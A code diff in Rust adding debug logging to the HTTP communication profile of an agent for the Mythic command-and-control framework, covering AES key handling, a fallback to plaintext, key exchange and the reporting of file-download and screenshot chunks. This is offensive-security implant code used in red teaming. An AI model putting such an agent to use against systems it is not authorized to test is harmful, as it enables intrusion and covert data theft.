@@ -76,8 +76,25 @@ pub struct HttpProfile {
 impl HttpProfile {
     pub fn new(config: HttpInitialConfig) -> Self {
         let aes_key = if !config.aes_psk.is_empty() {
-            BASE64.decode(&config.aes_psk).ok()
+            match BASE64.decode(&config.aes_psk) {
+                Ok(key_bytes) => {
+                    utils::print_debug(&format!(
+                        "HTTP: AESPSK loaded ({} bytes), encrypted_exchange_check={}",
+                        key_bytes.len(),
+                        config.encrypted_exchange_check
+                    ));
+                    Some(key_bytes)
+                }
+                Err(e) => {
+                    utils::print_debug(&format!(
+                        "HTTP: WARNING - AESPSK base64 decode FAILED: {}. Agent will send PLAINTEXT!",
+                        e
+                    ));
+                    None
+                }
+            }
         } else {
+            utils::print_debug("HTTP: No AESPSK configured, agent will send plaintext");
             None
         };
 
@@ -175,8 +192,22 @@ impl HttpProfile {
         let aes_key = self.aes_key.read().unwrap();
 
         let encrypted = if let Some(key) = aes_key.as_ref() {
-            crypto::aes_encrypt(key, data)
+            let enc = crypto::aes_encrypt(key, data);
+            utils::print_debug(&format!(
+                "HTTP: encode_message: encrypted {} bytes -> {} bytes (key len={})",
+                data.len(), enc.len(), key.len()
+            ));
+            if enc.is_empty() {
+                utils::print_debug("HTTP: WARNING - aes_encrypt returned empty! Falling back to plaintext");
+                data.to_vec()
+            } else {
+                enc
+            }
         } else {
+            utils::print_debug(&format!(
+                "HTTP: encode_message: NO encryption (plaintext {} bytes)",
+                data.len()
+            ));
             data.to_vec()
         };
 
@@ -220,6 +251,10 @@ impl HttpProfile {
         if let Some(key) = aes_key.as_ref() {
             let decrypted = crypto::aes_decrypt(key, message_data);
             if decrypted.is_empty() {
+                utils::print_debug(&format!(
+                    "HTTP: decode_response: AES decrypt FAILED (message_data={} bytes, key={} bytes)",
+                    message_data.len(), key.len()
+                ));
                 None
             } else {
                 Some(decrypted)
@@ -287,8 +322,14 @@ impl HttpProfile {
     async fn negotiate_key(&self) -> bool {
         let exchange_check = *self.encrypted_exchange_check.read().unwrap();
         if !exchange_check {
+            let has_key = self.aes_key.read().unwrap().is_some();
+            utils::print_debug(&format!(
+                "HTTP: encrypted_exchange_check=false, skipping EKE (has_aes_key={})",
+                has_key
+            ));
             return true; // No exchange needed
         }
+        utils::print_debug("HTTP: encrypted_exchange_check=true, performing EKE key exchange");
 
         let (pub_pem, priv_key) = match crypto::generate_rsa_keypair() {
             Some(pair) => pair,
@@ -469,8 +510,31 @@ impl Profile for HttpProfile {
             }
 
             // Build get_tasking message, including any buffered responses
-            utils::print_debug("HTTP: Building get_tasking message");
             let msg = crate::responses::drain_poll_buffer();
+            let has_responses = msg.responses.as_ref().map_or(0, |r| r.len());
+            if has_responses > 0 {
+                // Log details about what we're sending
+                for (idx, resp) in msg.responses.as_ref().unwrap().iter().enumerate() {
+                    let has_download = resp.download.is_some();
+                    let has_upload = resp.upload.is_some();
+                    let has_tracking = resp.tracking_uuid.is_some();
+                    if has_download || has_upload {
+                        let dl_info = resp.download.as_ref().map(|d| {
+                            format!("chunk_num={} total={} is_screenshot={} file_id_len={} chunk_data_len={}",
+                                d.chunk_num, d.total_chunks, d.is_screenshot,
+                                d.file_id.len(), d.chunk_data.len())
+                        }).unwrap_or_default();
+                        utils::print_debug(&format!(
+                            "HTTP: Response[{}]: task={} tracking={} download=[{}] completed={}",
+                            idx, resp.task_id, has_tracking, dl_info, resp.completed
+                        ));
+                    }
+                }
+                utils::print_debug(&format!(
+                    "HTTP: Sending {} buffered response(s) to Mythic",
+                    has_responses
+                ));
+            }
             let msg_json = match serde_json::to_vec(&msg) {
                 Ok(j) => j,
                 Err(e) => {
@@ -486,7 +550,12 @@ impl Profile for HttpProfile {
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
-                        utils::print_debug(&format!("HTTP: Parsed response, {} tasks", mythic_response.tasks.len()));
+                        utils::print_debug(&format!(
+                            "HTTP: Parsed response: {} tasks, {} responses, {} delegates",
+                            mythic_response.tasks.len(),
+                            mythic_response.responses.len(),
+                            mythic_response.delegates.len()
+                        ));
                         tasks::handle_message_from_mythic(mythic_response).await;
                     }
                     Err(e) => {
